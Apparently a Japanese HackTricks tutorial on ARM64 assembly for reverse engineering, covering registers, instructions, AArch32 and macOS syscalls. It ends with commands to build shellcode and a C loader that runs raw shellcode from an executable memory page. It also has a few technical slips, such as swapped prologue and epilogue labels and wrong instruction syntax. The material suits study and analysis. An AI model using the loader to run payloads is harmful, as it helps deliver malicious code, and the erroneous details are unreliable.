# ARM64v8入門

{{#include ../../../banners/hacktricks-training.md}}

## **例外レベル - EL (ARM64v8)**

ARMv8アーキテクチャでは、Exception Levels（EL）と呼ばれる実行レベルが実行環境の特権レベルと機能を定義します。EL0からEL3までの4つの例外レベルがあり、それぞれ異なる目的を持ちます：

1. **EL0 - ユーザモード**:
- 最も権限の低いレベルで、通常のアプリケーションコードの実行に使用されます。
- EL0で動作するアプリケーションは互いにおよびシステムソフトウェアから分離されており、セキュリティと安定性が向上します。
2. **EL1 - OSカーネルモード**:
- 多くのオペレーティングシステムカーネルはこのレベルで動作します。
- EL1はEL0より多くの特権を持ち、システムリソースにアクセスできますが、システムの整合性を確保するための制約があります。
3. **EL2 - ハイパーバイザモード**:
- 仮想化に使用されるレベルです。EL2で動作するハイパーバイザは同一ハードウェア上で複数のOS（それぞれがEL1で動作）を管理できます。
- EL2は仮想化環境の隔離と制御のための機能を提供します。
4. **EL3 - セキュアモニタモード**:
- 最も特権の高いレベルで、セキュアブートや信頼実行環境に使用されることが多いです。
- EL3はセキュア状態と非セキュア状態間（例：secure boot、trusted OSなど）のアクセスを管理・制御できます。

これらのレベルを利用することで、ユーザアプリケーションから最も特権の高いシステムソフトウェアに至るまで、システムのさまざまな側面を構造化された安全な方法で管理できます。ARMv8の特権レイヤーのアプローチは、異なるシステムコンポーネントを効果的に分離し、システムのセキュリティと堅牢性を高めます。

## **レジスタ (ARM64v8)**

ARM64には`x0`から`x30`までの**31個の汎用レジスタ**があり、それぞれ**64ビット**（8バイト）値を格納できます。32ビット値のみを扱う操作の場合、同じレジスタは`w0`〜`w30`という名前で32ビットモードとしてアクセスできます。

1. **`x0`** 〜 **`x7`** - 通常スクラッチレジスタとして、サブルーチンへのパラメータ渡しに使われます。
- **`x0`** は関数の戻り値も格納します。
2. **`x8`** - Linuxカーネルでは、`svc`命令のシステムコール番号に`x8`が使われます。**macOSではx16が使われます！**
3. **`x9`** 〜 **`x15`** - ローカル変数などに使われる一時レジスタ。
4. **`x16`** と **`x17`** - **Intra-procedural Call Registers**。即値用の一時レジスタ。間接関数呼び出しやPLTスタブにも使われます。
- **`x16`** は **macOS** における **`svc`** 命令の **システムコール番号** に使われます。
5. **`x18`** - **プラットフォームレジスタ**。汎用レジスタとして使用可能ですが、プラットフォームによっては専用用途に予約されています：Windowsではカレントスレッド環境ブロックへのポインタ、Linuxカーネルでは現在実行中のタスク構造体へのポインタなど。
6. **`x19`** 〜 **`x28`** - カリー保存（callee-saved）レジスタ。関数は呼び出し側のためにこれらの値を保持する必要があり、スタックに保存して呼び出し元に戻る前に復元します。
7. **`x29`** - **フレームポインタ**。スタックフレームを追跡するために使用されます。関数呼び出しで新しいスタックフレームが作成されると、**`x29`** は**スタックに保存**され、新しいフレームポインタアドレス（`sp`のアドレス）が**このレジスタに格納**されます。
- このレジスタは通常ローカル変数の参照に使われますが、汎用レジスタとしても使用可能です。
8. **`x30`** または **`lr`** - **リンクレジスタ**。`BL`（Branch with Link）や`BLR`（Branch with Link to Register）命令が実行されると、戻りアドレス（`pc`の値）をこのレジスタに保存します。
- 他のレジスタと同様に使用することもできます。
- 現在の関数が新しい関数を呼び出して`lr`を上書きする場合、関数の冒頭で`lr`をスタックに保存します（これはエピローグ相当の処理：`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`と`lr`を保存しスペースを確保して新しい`fp`を設定）し、終了時に復元します（プロローグ相当の処理：`ldp x29, x30, [sp], #48; ret` -> `fp`と`lr`を復元して戻る）。
9. **`sp`** - **スタックポインタ**。スタックの先端を追跡するために使用されます。
- **`sp`** の値は常に少なくとも**クアッドワード整列（quadword alignment）**を保つ必要があり、そうでないとアラインメント例外が発生することがあります。
10. **`pc`** - **プログラムカウンタ**。次の命令を指します。このレジスタは例外生成、例外復帰、分岐によってのみ更新できます。通常の命令でこのレジスタを読むのは、`BL`や`BLR`といったリンク付き分岐命令だけで、それらは`pc`アドレスを`lr`に格納します。
11. **`xzr`** - **ゼロレジスタ**。32ビット形は**`wzr`**と呼ばれます。ゼロ値を簡単に得るため（一般的な操作）や、`subs`のように結果をどこにも格納しない比較に使えます（例：`subs XZR, Xn, #10`）。

**`Wn`** レジスタは **`Xn`** レジスタの **32ビット版** です。

> [!TIP]
> X0〜X18のレジスタは破壊可能（volatile）で、関数呼び出しや割り込みによって値が変更される可能性があります。一方、X19〜X28は非破壊（non-volatile）で、関数呼び出しの間に値を保持する必要があります（"callee saved"）。

### SIMDおよび浮動小数点レジスタ

さらに、最適化されたSIMD（Single Instruction Multiple Data）操作および浮動小数点演算に使用できる128ビット長の**32個のレジスタ**があります。これらはVnレジスタと呼ばれますが、64ビット、32ビット、16ビット、8ビットでも動作可能で、その場合はそれぞれ**`Qn`**, **`Dn`**, **`Sn`**, **`Hn`**, **`Bn`** と呼ばれます。

### システムレジスタ

**何百ものシステムレジスタ**（special-purpose registers, SPRs）があり、プロセッサの動作を**監視**および**制御**するために使われます。\
これらは専用の命令 **`mrs`** と **`msr`** を使ってのみ読み書きできます。

特殊レジスタの **`TPIDR_EL0`** と **`TPIDDR_EL0`** はリバースエンジニアリングでよく見かけます。`EL0`というサフィックスはそのレジスタがアクセス可能な**最小の例外レベル**を示します（この場合EL0は通常のプログラムが動作する権限レベルです）。\
これらはスレッドローカルストレージのベースアドレスを格納するために使われることが多いです。通常、最初のものはEL0で読み書き可能ですが、2番目のものはEL0から読み取り、EL1（カーネル）から書き込みが可能、というような違いがあります。

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** はいくつかのプロセスコンポーネントをまとまった形でオペレーティングシステムから見える **`SPSR_ELx`** 特殊レジスタにシリアライズします（ここでXはトリガされた例外の**権限レベル**を示します。例外終了時にプロセス状態を復元できるようにするためです）。\
アクセス可能なフィールドは以下の通りです：

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`**, **`V`** の条件フラグ:
- **`N`**: 演算結果が負であったことを意味します
- **`Z`**: 演算結果がゼロであったことを意味します
- **`C`**: 繰り上がり（キャリー）があったことを意味します
- **`V`**: 符号付きオーバーフローが発生したことを意味します:
- 2つの正の数の和が負になる場合
- 2つの負の数の和が正になる場合
- 引き算で、大きい負の数から小さい正の数を引く（またはその逆）など、結果が与えられたビット幅で表現できない場合
- プロセッサは演算が符号付きか符号無しかを知らないため、CとVを組み合わせて演算でキャリーやオーバーフローが発生したかを示します。

> [!WARNING]
> すべての命令がこれらのフラグを更新するわけではありません。`CMP`や`TST`のような命令は更新しますし、`s`サフィックスのある`ADDS`なども更新します。

- 現在の**レジスタ幅（`nRW`）フラグ**: フラグが0なら、再開時にプログラムはAArch64実行状態で動作します。
- 現在の**例外レベル（`EL`）**: EL0で動作する通常プログラムは0になります。
- **シングルステップ（`SS`）フラグ**: デバッガが例外を介して`SPSR_ELx`内のSSフラグを1にセットすることでシングルステップを実現します。プログラムは1ステップ実行し、シングルステップ例外を発行します。
- **不正な例外状態（`IL`）フラグ**: 特権ソフトウェアが無効な例外レベル遷移を行ったときにこのフラグが1にセットされ、プロセッサは不正な状態例外をトリガします。
- **`DAIF` フラグ**: これらのフラグは特権プログラムが特定の外部例外を選択的にマスクすることを可能にします。
- **`A`** が1なら非同期アボート（asynchronous aborts）がトリガされます。**`I`** は外部ハードウェア割り込み要求（IRQ）への応答を制御し、**`F`** はファスト割り込み要求（FIQ）に関連します。
- **スタックポインタ選択（`SPS`）フラグ**: EL1以上で実行される特権プログラムは、自身のスタックポインタレジスタとユーザモデルのスタックポインタ（例：`SP_EL1` と `EL0`）を切り替えることができます。この切り替えは `SPSel` 特殊レジスタへの書き込みで行われます。EL0からは実行できません。

## **呼び出し規約 (ARM64v8)**

ARM64の呼び出し規約では、関数への最初の8個のパラメータはレジスタ `x0` から `x7` に渡されます。追加のパラメータは**スタック**経由で渡されます。戻り値はレジスタ `x0` に返され、もし128ビット長の戻り値なら `x1` も使われます。`x19` から `x30` と `sp` は関数呼び出しの間に**保存**される必要があります。

アセンブリで関数を読むときは、**関数のプロローグとエピローグ**を探してください。**プロローグ**は通常、**フレームポインタ（`x29`）を保存**し、**新しいフレームポインタを設定**し、**スタック領域を確保**する処理を含みます。**エピローグ**は通常、**保存したフレームポインタを復元**し、関数から**戻る**処理を含みます。

### Swiftの呼び出し規約

Swiftは独自の**呼び出し規約**を持っており、それは次で確認できます: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **よく使われる命令 (ARM64v8)**

ARM64命令は一般に **`opcode dst, src1, src2`** の形式を取り、ここで **`opcode`** は実行する操作（`add`, `sub`, `mov` など）、**`dst`** は結果を格納する宛先レジスタ、**`src1`** と **`src2`** がソースレジスタです。即値をソースレジスタの代わりに使うこともできます。

- **`mov`**: レジスタ間で値を**移動**します。
- 例: `mov x0, x1` — `x1`の値を`x0`に移動します。
- **`ldr`**: **メモリから**値を**レジスタへロード**します。
- 例: `ldr x0, [x1]` — `x1`が指すメモリ位置から値を読み取り`x0`に格納します。
- **オフセットモード**: オリジンポインタに影響するオフセットが示されます。例えば:
- `ldr x2, [x1, #8]` は x1 + 8 のアドレスから値をロードして x2 に入れます
- `ldr x2, [x0, x1, lsl #2]` は配列 x0 の x1（インデックス）位置 * 4 からオブジェクトをロードして x2 に入れます
- **プリインデックスモード**: 計算をオリジンに適用して結果を取得し、その新しいオリジンをオリジンレジスタに格納します。
- `ldr x2, [x1, #8]!` は `x1 + 8` の値を x2 にロードし、x1 に `x1 + 8` を格納します
- `str lr, [sp, #-4]!` はリンクレジスタを sp に格納し、sp を更新します
- **ポストインデックスモード**: 前者に似ていますが、メモリアドレスにアクセスした後でオフセットを計算して格納します。
- `ldr x0, [x1], #8` は x1 の値を x0 にロードし、x1 を `x1 + 8` に更新します
- **PC相対アドレッシング**: 読み込むアドレスが PC レジスタに対して相対的に計算されます
- `ldr x1, =_start` は現在のPCに関連して `_start` シンボルの開始アドレスを x1 にロードします。
- **`str`**: レジスタからメモリへ値を**ストア**します。
- 例: `str x0, [x1]` — `x0`の値を`x1`が指すメモリ位置に格納します。
- **`ldp`**: **ペアロード**。連続するメモリ位置から2つのレジスタをロードします。メモリアドレスは通常別のレジスタにオフセットを加えたものです。
- 例: `ldp x0, x1, [x2]` — `x2`と`x2 + 8`からそれぞれ`x0`と`x1`をロードします。
- **`stp`**: **ペアストア**。連続するメモリ位置へ2つのレジスタを格納します。
- 例: `stp x0, x1, [sp]` — `x0`と`x1`をそれぞれ`sp`と`sp + 8`に格納します。
- `stp x0, x1, [sp, #16]!` — `x0`と`x1`を`sp+16`と`sp+24`に格納し、`sp`を`sp+16`に更新します。
- **`add`**: 2つのレジスタの値を加算して結果をレジスタに格納します。
- 構文: add(s) Xn1, Xn2, Xn3 | #imm, [shift #N | RRX]
- Xn1 -> 宛先
- Xn2 -> オペランド1
- Xn3 | #imm -> オペランド2（レジスタまたは即値）
- [shift #N | RRX] -> シフトを行うか RRX を呼ぶ
- 例: `add x0, x1, x2` — `x1`と`x2`の値を加算して`x0`に格納します。
- `add x5, x5, #1, lsl #12` — これは4096に相当します（1を12回左シフト）-> 1 0000 0000 0000 0000
- **`adds`**: `add`を実行しフラグを更新します。
- **`sub`**: 2つのレジスタの値を減算して結果をレジスタに格納します（`add`と同様の構文）。
- 例: `sub x0, x1, x2` — `x1`から`x2`を引いて結果を`x0`に格納します。
- **`subs`**: `sub`だがフラグを更新します。
- **`mul`**: 2つのレジスタの値を乗算して結果を格納します。
- 例: `mul x0, x1, x2` — `x1`と`x2`を乗算して`x0`に格納します。
- **`div`**: 1つのレジスタの値を別のレジスタで除算して結果を格納します。
- 例: `div x0, x1, x2` — `x1`を`x2`で除算して結果を`x0`に格納します。
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: ビットを左に移動し末尾に0を追加（2のn乗による乗算）
- **Logical shift right**: ビットを右に移動し先頭に0を追加（符号無しでの2のn乗による除算）
- **Arithmetic shift right**: `lsr`に似ますが、最上位ビットが1の場合は先頭に1を追加します（符号付きでの2のn乗による除算）
- **Rotate right**: `lsr`に似ていますが、右から削除されたビットが左に回転されて追加されます
- **Rotate Right with Extend**: `ror`に似ていますが、キャリーフラグを「最上位ビット」として扱います。キャリーフラグがビット31に移り、削除されたビットがキャリーフラグに入ります。
- **`bfm`**: Bit Field Move。これらの操作は値のビット `0...n` をコピーして位置 `m..m+n` に配置します。`#s` は左端のビット位置、`#r` は右回転量を指定します。
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** レジスタからビットフィールドをコピーして別のレジスタにコピーします。
- **`BFI X1, X2, #3, #4`** X2の4ビットをX1の3ビット目から挿入します
- **`BFXIL X1, X2, #3, #4`** X2の3ビット目から4ビットを抽出してX1にコピーします
- **`SBFIZ X1, X2, #3, #4`** X2の4ビットを符号拡張してX1のビット位置3から挿入し、右側のビットを0にします
- **`SBFX X1, X2, #3, #4`** X2のビット3から4ビットを抽出して符号拡張し、結果をX1に配置します
- **`UBFIZ X1, X2, #3, #4`** X2の4ビットをゼロ拡張してX1のビット位置3から挿入し、右側のビットを0にします
- **`UBFX X1, X2, #3, #4`** X2のビット3から4ビットを抽出してゼロ拡張した結果をX1に配置します。
- **Sign Extend To X:** 値の符号を拡張（符号無しの場合は0を埋める）して演算に使えるようにします:
- **`SXTB X1, W2`** W2の1バイトの符号を拡張してX1に（W2はX2の下位半分）
- **`SXTH X1, W2`** 16ビットの符号を拡張してX1に
- **`SXTW X1, W2`** 32ビットの符号を拡張してX1に
- **`UXTB X1, W2`** W2のバイトをゼロ拡張してX1に
- **`extr`**: 指定したレジスタペアを連結してからビットを抽出します。
- 例: `EXTR W3, W2, W1, #3` これは `W1+W2` を連結し、W2のビット3からW1のビット3までを取り出して W3 に格納します。
- **`cmp`**: 2つのレジスタを比較して条件フラグを設定します。これは `subs` のエイリアスで、宛先レジスタをゼロレジスタに設定します。`m == n` かどうかを知るのに便利です。
- `subs` と同じ構文をサポートします。
- 例: `cmp x0, x1` — `x0` と `x1` を比較して条件フラグを設定します。
- **`cmn`**: 負のオペランドを比較します。これは `adds` のエイリアスで同じ構文をサポートします。`m == -n` を知るのに便利です。
- **`ccmp`**: 条件付き比較。これは前の比較が真のときのみ実行され、特に `nzcv` ビットを設定します。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> もし x1 != x2 かつ x3 < x4 なら func にジャンプ
- これは `ccmp` が前の `cmp` が `NE` の場合にのみ実行されるためです。そうでない場合、`nzcv` ビットは0にセットされ（`blt`の条件を満たしません）。
- これは `ccmn`（同様だが負の比較）としても使用できます。
- **`tst`**: 比較の値のいずれかのビットが1かを検査します（結果はどこにも格納しない ANDS のように動作）。レジスタと値を比較して指定したビットが1かどうかをチェックするのに便利です。
- 例: `tst X1, #7` X1の下位3ビットのいずれかが1かをチェックします
- **`teq`**: 結果を破棄するXOR操作
- **`b`**: 無条件分岐
- 例: `b myFunction`
- これはリンクレジスタに戻りアドレスをセットしないので、戻る必要のあるサブルーチン呼び出しには不適です。
- **`bl`**: リンク付き分岐。サブルーチン呼び出しに使用され、**戻りアドレスを`x30`に保存**します。
- 例: `bl myFunction` — 関数 `myFunction` を呼び出し、戻りアドレスを `x30` に保存します。
- **`blr`**: レジスタへのリンク付き分岐。ターゲットがレジスタで指定されるサブルーチン呼び出しに使われ、戻りアドレスを `x30` に保存します。
- 例: `blr x1` — x1に格納されたアドレスの関数を呼び出し、戻りアドレスを `x30` に保存します。
- **`ret`**: サブルーチンからの戻り。通常 `x30` のアドレスを使います。
- 例: `ret` — 現在のサブルーチンから `x30` の戻りアドレスを使って戻ります。
- **`b.<cond>`**: 条件付き分岐
- **`b.eq`**: 等しい場合に分岐（直前の `cmp` に基づく）。
- 例: `b.eq label` — 直前の `cmp` で等しいと判断されたら `label` にジャンプします。
- **`b.ne`**: 等しくない場合に分岐。条件フラグをチェックし、等しくない場合はラベルやアドレスへ分岐します。
- 例: `cmp x0, x1` の後に `b.ne label` — `x0` と `x1` が等しくない場合に `label` にジャンプします。
- **`cbz`**: ゼロと比較して分岐。レジスタをゼロと比較し、等しければ分岐します。
- 例: `cbz x0, label` — `x0` がゼロなら `label` にジャンプします。
- **`cbnz`**: ゼロでない場合に分岐。
- 例: `cbnz x0, label` — `x0` がゼロでなければ `label` にジャンプします。
- **`tbnz`**: 指定ビットをテストしてゼロでなければ分岐
- 例: `tbnz x0, #8, label`
- **`tbz`**: 指定ビットをテストしてゼロなら分岐
- 例: `tbz x0, #8, label`
- **条件付きセレクト操作**: 条件ビットに応じて動作が変わる操作群。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 真なら X0 = X1, 偽なら X0 = X2
- `csinc Xd, Xn, Xm, cond` -> 真なら Xd = Xn, 偽なら Xd = Xm + 1
- `cinc Xd, Xn, cond` -> 真なら Xd = Xn + 1, 偽なら Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> 真なら Xd = Xn, 偽なら Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> 真なら Xd = NOT(Xn), 偽なら Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> 真なら Xd = Xn, 偽なら Xd = -Xm
- `cneg Xd, Xn, cond` -> 真なら Xd = -Xn, 偽なら Xd = Xn
- `cset Xd, Xn, Xm, cond` -> 真なら Xd = 1, 偽なら Xd = 0
- `csetm Xd, Xn, Xm, cond` -> 真なら Xd = <全ビット1>, 偽なら Xd = 0
- **`adrp`**: シンボルのページアドレスを計算してレジスタに格納します。
- 例: `adrp x0, symbol` — `symbol` のページアドレスを計算して `x0` に格納します。
- **`ldrsw`**: メモリから符号付き32ビット値をロードし、それを64ビットへ符号拡張して格納します。
- 例: `ldrsw x0, [x1]` — `x1`が指すメモリ位置から符号付き32ビット値をロードし、64ビットに符号拡張して`x0`に格納します。
- **`stur`**: オフセットを使ってレジスタの値をメモリ位置にストアします。
- 例: `stur x0, [x1, #4]` — `x1`の示すアドレスから4バイト先のメモリ位置に`x0`の値を格納します。
- **`svc`** : システムコールを行います。Supervisor Callの略です。この命令を実行すると、プロセッサはユーザモードからカーネルモードへ切り替わり、カーネルのシステムコール処理コードがある特定の場所にジャンプします。

- 例:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **リンクレジスタとフレームポインタをスタックに保存する**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **新しいフレームポインタを設定する**: `mov x29, sp` (現在の関数の新しいフレームポインタを設定する)
3. **ローカル変数用にスタック上の領域を確保する**（必要な場合）: `sub sp, sp, <size>` (`<size>` は必要なバイト数)

### **関数のエピローグ**

1. **ローカル変数の領域を解放する**（もし割り当てられていれば）: `add sp, sp, <size>`
2. **リンクレジスタとフレームポインタを復元する**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (リンクレジスタのアドレスを使用して呼び出し元に制御を返す)

## AARCH32 Execution State

Armv8-A は 32-bit プログラムの実行をサポートする。**AArch32** は **2つの命令セット** のいずれか、**`A32`** と **`T32`** で動作でき、**`interworking`** によってそれらを切り替えられる。\
**特権** の 64-bit プログラムは、より低い特権の 32-bit へ例外レベルを移すことにより、**32-bit の実行** をスケジュールできる。\
64-bit から 32-bit への遷移は、より低い例外レベル（例えば EL1 の 64-bit プログラムが EL0 のプログラムを起動する場合）で発生する点に注意。これは、`AArch32` プロセススレッドが実行準備完了したときに、特殊レジスタ **`SPSR_ELx``** の **bit 4 を 1 に設定**し、`SPSR_ELx` の残りが **`AArch32`** プログラムの CPSR を保持することで行われる。次に、特権プロセスが **`ERET`** 命令を呼び出すとプロセッサは **`AArch32`** に遷移し、CPSR によって A32 または T32 に入る**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
これは **interworking branch instructions,** の間に設定されるが、PC を送先レジスタに設定する他の命令で直接設定することもできる。例：

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### レジスタ

16個の32-bitレジスタがあります (r0-r15)。 **r0からr14までは** 任意の操作に使用できますが、いくつかは通常予約されています:

- **`r15`**: Program counter（常に）。次の命令のアドレスを含みます。A32では現在の命令アドレス + 8、T32では現在の命令アドレス + 4。
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer（スタックは常に16バイト境界に揃えられていることに注意）
- **`r14`**: Link Register

さらに、レジスタは **`banked registries`** にバックアップされます。これはレジスタ値を格納し、例外処理や特権操作で毎回手動で保存・復元する必要を避けつつ、**高速なコンテキストスイッチ** を可能にする領域です。\
これは例外が取られたプロセッサモードの状態を **`CPSR` から `SPSR` に保存する** ことで行われます。例外復帰時には **`SPSR`** から **`CPSR`** が復元されます。

### CPSR - Current Program Status Register

AArch32では CPSR は AArch64 の **`PSTATE`** と同様に機能し、例外発生時に実行を後で復元するために **`SPSR_ELx`** に格納されます:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

フィールドはいくつかのグループに分かれています:

- Application Program Status Register (APSR): 算術フラグで、EL0からアクセス可能
- Execution State Registers: プロセスの振る舞い（OSによって管理）

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** フラグ（AArch64と同様）
- **`Q`** フラグ: 特定の飽和算術命令の実行中に整数の飽和が発生すると1に設定されます。一度 **`1`** に設定されると手動で0に設定されるまでその値を保持します。さらに、このフラグを暗黙的にチェックする命令はなく、手動で読み取る必要があります。
- **`GE`**（Greater than or equal）フラグ: SIMD（Single Instruction, Multiple Data）演算、例えば "parallel add" や "parallel subtract" のような操作で使用されます。これらの操作は単一命令で複数のデータポイントを処理できます。

例えば、**`UADD8`** 命令は（2つの32-bitオペランドから）4組のバイトを並列に加算して結果を32-bitレジスタに格納します。次にこれらの結果に基づいて **`APSR` の `GE` フラグ** を設定します。各 GE フラグは各バイト加算に対応し、そのバイトペアの加算で**オーバーフロー**が発生したかを示します。

- **`SEL`** 命令はこれらの GE フラグを使用して条件付き動作を行います。

#### Execution State Registers

- **`J`** および **`T`** ビット: **`J`** は0であるべきで、**`T`** が0なら命令セットは A32、1なら T32 が使用されます。
- **IT Block State Register** (`ITSTATE`): ビット10-15および25-26です。**`IT`** プレフィックス付きのグループ内の命令に対する条件を格納します。
- **`E`** ビット: エンディアンを示します。
- **Mode and Exception Mask Bits** (0-4): 現在の実行状態を決定します。5番目のビットはプログラムが32bit（1）として動作しているか64bit（0）として動作しているかを示します。残りの4ビットは（例外が発生して処理されているときの）**現在使用中の例外モード**を表します。設定された値は、この処理中に別の例外が発生した場合の**現在の優先度**を示します。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: 特定の例外は **`A`**, `I`, `F` のビットで無効化できます。**`A`** が1であれば非同期アボート（asynchronous aborts）が発生します。**`I`** は外部ハードウェアの Interrupt Requests (IRQs) に応答する設定で、`F` は Fast Interrupt Requests (FIRs) に関連します。

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) を参照するか、`cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` を実行してください。BSD syscalls は **x16 > 0** になります。

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) の `mach_trap_table` と [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) のプロトタイプを確認してください。Mach traps の最大数は `MACH_TRAP_TABLE_COUNT` = 128 です。Mach traps は **x16 < 0** となるため、前述のリストの番号をマイナスで呼び出す必要があります: **`_kernelrpc_mach_vm_allocate_trap`** は **`-10`** です。

逆アセンブラで **`libsystem_kernel.dylib`** を確認すると、これら（および BSD）syscalls の呼び出し方が分かります:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> 時には、**`libsystem_kernel.dylib`** の **decompiled** コードを確認する方が、**than** **source code** を確認するより簡単なことがあります。なぜなら、いくつかの syscalls（BSD と Mach）はスクリプトで生成されており（ソースコード内のコメントを確認してください）、dylib には実際に何が呼ばれているかがわかるからです。

### machdep calls

XNU は machine dependent と呼ばれる別の種類の呼び出しをサポートしています。これらの呼び出しの番号はアーキテクチャに依存し、呼び出し名や番号が恒久的に一定であるとは保証されません。

### comm page

これはカーネル所有のメモリページで、すべてのユーザープロセスのアドレス空間にマップされます。syscall を使うと非効率になってしまうほど頻繁に使われるカーネルサービスについて、ユーザーモードからカーネル空間への遷移を高速化することを目的としています。

例えば、`gettimeofdate` は comm page から直接 `timeval` の値を読み取ります。

### objc_msgSend

Objective-C や Swift のプログラムでこの関数が使われているのを見かけるのは非常に一般的です。この関数は Objective-C オブジェクトのメソッドを呼び出すことを可能にします。

パラメータ ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> インスタンスへのポインタ
- x1: op -> メソッドのセレクタ
- x2... -> 呼び出されるメソッドの残りの引数

したがって、この関数への分岐の直前にブレークポイントを置くと、lldb で何が呼び出されているかを簡単に特定できます（この例ではオブジェクトがコマンドを実行する `NSConcreteTask` のオブジェクトを呼び出しています）：
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 環境変数 **`NSObjCMessageLoggingEnabled=1`** を設定すると、この関数が呼ばれたときに `/tmp/msgSends-pid` のようなファイルに**log**を記録できます。
>
> さらに、**`OBJC_HELP=1`** を設定して任意のバイナリを実行すると、特定の Objc-C アクションが発生したときに**log**するために使える他の環境変数を確認できます。

この関数が呼ばれたとき、指定されたインスタンスで呼び出されたメソッドを見つける必要があり、そのために以下のような検索が行われます:

- optimistic cache lookup を試行する:
- 成功したら完了
- runtimeLock (read) を取得する
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- クラス自身のキャッシュを試す:
- 成功したら完了
- クラスの method list を試す:
- 見つかったら cache を埋めて完了
- スーパークラスの cache を試す:
- 成功したら完了
- スーパークラスの method list を試す:
- 見つかったら cache を埋めて完了
- If (resolver) try method resolver, and repeat from class lookup
- それでも見つからない場合（= 他がすべて失敗した場合）は forwarder を試す

### Shellcodes

To compile:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
新しい macOS の場合:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcodeをテストするCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

